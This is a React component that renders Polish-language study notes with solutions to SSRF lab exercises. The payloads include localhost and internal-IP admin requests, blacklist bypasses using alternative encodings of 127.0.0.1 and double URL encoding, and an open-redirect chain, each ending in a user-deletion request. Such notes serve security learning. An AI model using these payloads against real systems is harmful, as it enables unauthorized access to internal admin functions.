const SSRF = () =>{
    return(
        <details>
            <summary>Server-side request forgery (SSRF)</summary>
                  
            <details>
                <summary>Podstawowy SSRF w stosunku do serwera lokalnego</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>http://localhost/admin</p>
                    <p>Następnie możemy zbadać stronę admina i zobaczyć url do usunięcia usera</p>
                    <p><span className="important">http://localhost/admin/delete?username=carlos</span></p>
                </div>
            </details>
                  
            <details>
                <summary>Podstawowy SSRF w porównaniu z innym systemem zaplecza</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>http://192.168.0.§1§:8080/admin</p>
                    <p>Szukamy aktywnego ip (status 200)</p>
                    <p>następnie dodajemy do url <span className="important">/admin/delete?username=carlos</span></p>
                </div>
            </details>
                  
            <details>
                <summary>SSRF z filtrem wejściowym opartym na czarnej liście</summary>
                <p>Możliwe obejścia:</p>
                <p>127.0.0.1</p>
                <p>2130706433</p>
                <p>017700000001</p>
                <p>127.1</p>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>http://127.1</p>
                    <p>Następnie musimy zakodować /admin 2 razy</p>
                    <p><span className="important">http://127.1%25%32%66%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</span></p>
                </div>
            </details>
                  
            <details>
                <summary>SSRF z pominięciem filtra poprzez lukę w zabezpieczeniach przekierowania otwartego</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <p>/product/nextProduct?path=http://192.168.0.12:8080/admin</p>
                    <p>Następnie możemy zbadać stronę admina i zobaczyć url do usunięcia usera</p>
                    <p><span className="important">/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos</span></p>
                </div>
            </details>
        </details>
    )
}

export default SSRF;